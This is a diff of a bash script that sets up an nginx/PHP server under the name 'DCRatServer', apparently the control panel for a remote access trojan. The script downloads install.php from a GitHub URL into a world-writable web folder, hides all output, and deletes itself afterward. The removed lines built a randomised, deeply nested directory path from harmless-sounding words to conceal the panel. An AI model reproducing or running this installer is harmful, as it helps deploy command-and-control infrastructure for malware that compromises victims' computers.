@@ -4,6 +4,7 @@ if [[ "$os_version" != "20.04" ]]; then
     echo "Need Ubuntu 20.04. Now running version $os_version."
     exit 1
 fi
+
 while [[ $# -gt 0 ]]; do
     case $1 in
         -d|--domain)
@@ -15,18 +16,21 @@ while [[ $# -gt 0 ]]; do
             ;;
     esac
 done
+
 log_progress() {
     timestamp=$(date +"%H:%M")
     elapsed_time=$(( SECONDS - start_time ))
     printf "[%02d:%02d] %s\n" $((elapsed_time/60)) $((elapsed_time%60)) "$1"
 }
+
 log() {
     printf "%s\n" "$1"
 }
+
 clear
 echo "Preparing the system..."
 sudo apt update -y > /dev/null 2>&1 && sudo apt upgrade -y > /dev/null 2>&1
-echo "Preparing DON3!"
+echo "Preparing DCRatServer!"
 sleep 5
 clear
 start_time=$SECONDS
@@ -37,7 +41,7 @@ echo "Work log:"
 sleep 3
 log_progress "Checking system configuration"
 sleep 1
-log_progress "Preparing for packages installation"
+log_progress "Preparing for package installation"
 sudo apt install -y software-properties-common curl wget gnupg2 ca-certificates lsb-release ubuntu-keyring > /dev/null 2>&1
 sleep 1
 log_progress "Installing packages"
@@ -56,25 +60,23 @@ sleep 1
 sudo apt install -y php7.4-fpm php7.4-cli php7.4-curl php7.4-sqlite3 php7.4-common php7.4-opcache php7.4-mbstring php7.4-xml php7.4-mysql > /dev/null 2>&1
 sleep 1
 log_progress "Configuring packages"
-sudo mkdir -p /var/www/html > /dev/null 2>&1
-sudo chown -R www-data:www-data /var/www/html > /dev/null 2>&1
-sudo chmod -R 755 /var/www/html > /dev/null 2>&1
-sudo touch /var/www/html/index.html > /dev/null 2>&1
+sudo mkdir -p /var/www/DCRatServer > /dev/null 2>&1
+sudo chown -R www-data:www-data /var/www/DCRatServer > /dev/null 2>&1
+sudo chmod -R 755 /var/www/DCRatServer > /dev/null 2>&1
+sudo touch /var/www/DCRatServer/index.html > /dev/null 2>&1
 sleep 1
+
 server_ip=$(hostname -I | awk '{print $1}')
 if [ -z "$domain" ]; then
     domain="$server_ip"
 fi
-config_file="/etc/nginx/sites-available/$domain"
+
+config_file="/etc/nginx/sites-available/DCRatServer"
 sudo tee "$config_file" > /dev/null << EOL
 server {
     listen 80 default_server;
-    #listen [::]:80 default_server;
-
-    root /var/www/html;
-
+    root /var/www/DCRatServer;
     index index.php index.html index.htm index.nginx-debian.html;
-
     server_name $domain;
 
     keepalive_timeout 70;
@@ -98,16 +100,16 @@ server {
     }
 }
 EOL
-if [ ! -z "$domain" ]; then
-    sudo ln -sf "$config_file" /etc/nginx/sites-enabled/ > /dev/null 2>&1
-    sleep 1
-fi
+
+sudo ln -sf "$config_file" /etc/nginx/sites-enabled/ > /dev/null 2>&1
+sleep 1
 sudo nginx -t > /dev/null 2>&1
 sleep 1
 sudo systemctl restart nginx > /dev/null 2>&1
 sudo systemctl restart php7.4-fpm > /dev/null 2>&1
 sleep 1
-sudo tee /etc/php/7.4/fpm/conf.d/custom.ini > /dev/null << 'EOL'
+
+sudo tee /etc/php/7.4/fpm/conf.d/DCRatServer.ini > /dev/null << 'EOL'
 memory_limit = 800M
 max_execution_time = 60
 post_max_size = 9000000M
@@ -115,53 +117,25 @@ upload_max_filesize = 9000000M
 max_input_time = 60
 max_input_vars = 1000
 EOL
+
 sleep 1
 sudo systemctl restart php7.4-fpm > /dev/null 2>&1
-words=("provider" "external" "eternal" "image" "video" "vm" "line" "pipe" "to" "python" "php" "javascript" "js" "_" "request" "poll" "secure" "http" "packet" "low" "geo" "cpu" "update" "process" "processor" "auth" "game" "longpoll" "api" "bigload" "server" "multi" "protect" "default" "sql" "db" "base" "linux" "windows" "flower" "async" "generator" "traffic" "test" "universal" "track" "wordpress" "datalife" "wp" "dle" "local" "public" "private" "temp" "cdn" "central" "uploads" "downloads" "temporary")
-generate_dir_name() {
-    if (( RANDOM % 5 == 0 )); then
-        echo "$(( RANDOM % 10 ))"
-        return
-    fi
-    num_words=$(( (RANDOM % 4) + 1 ))
-    name=""
-    for (( i=0; i<num_words; i++ )); do
-        rand_index=$(( RANDOM % ${#words[@]} ))
-        word=${words[$rand_index]}
-        if (( RANDOM % 2 == 0 )); then
-            modified_word="${word^}"
-        else
-            modified_word="${word,,}"
-        fi
-        name="${name}${modified_word}"
-    done
-    if (( RANDOM % 2 == 0 )); then
-        digit=$(( RANDOM % 10 ))
-        if (( RANDOM % 2 == 0 )); then
-            name="${digit}${name}"
-        else
-            name="${name}${digit}"
-        fi
-    fi
-    echo "$name"
-}
-nested_path=""
-for (( i=1; i<=20; i++ )); do
-    dir_name=$(generate_dir_name)
-    nested_path="${nested_path}/${dir_name}"
-done
-sudo rm -rf "/var/www/html${nested_path}" > /dev/null 2>&1
-sudo mkdir -p "/var/www/html${nested_path}" > /dev/null 2>&1
-sudo chmod -R 777 "/var/www/html${nested_path}" > /dev/null 2>&1
+
+# Создание папки DCRatServer и установка файлов
+nested_path="/var/www/DCRatServer"
+sudo rm -rf "$nested_path" > /dev/null 2>&1
+sudo mkdir -p "$nested_path" > /dev/null 2>&1
+sudo chmod -R 777 "$nested_path" > /dev/null 2>&1
 sleep 1
-sudo find "/var/www/html${nested_path}" -type d -exec touch {}/index.html \;
-sleep 1
-sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "/var/www/html${nested_path}/install.php" > /dev/null 2>&1
-sudo chmod 777 "/var/www/html${nested_path}/install.php" > /dev/null 2>&1
+sudo touch "$nested_path/index.html"
+sudo curl -fsSL https://raw.githubusercontent.com/yma-Lib/Cht-Lib/refs/heads/main/install.php -o "$nested_path/install.php" > /dev/null 2>&1
+sudo chmod 777 "$nested_path/install.php" > /dev/null 2>&1
 sleep 3
+
 elapsed_time=$(( SECONDS - start_time ))
-log "✅ Installation and configuration is successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
-log "🔗 Link to the installer: http://$domain${nested_path}/install.php"
+log "✅ Installation and configuration successfully completed in $(printf '%02d:%02d' $((elapsed_time/60)) $((elapsed_time%60)))!"
+log "🔗 Link to the installer: http://$domain/install.php"
 log "❕ Link can only be used once."
+
 sudo rm -- "$0" > /dev/null 2>&1
 sudo rm install.php > /dev/null 2>&1
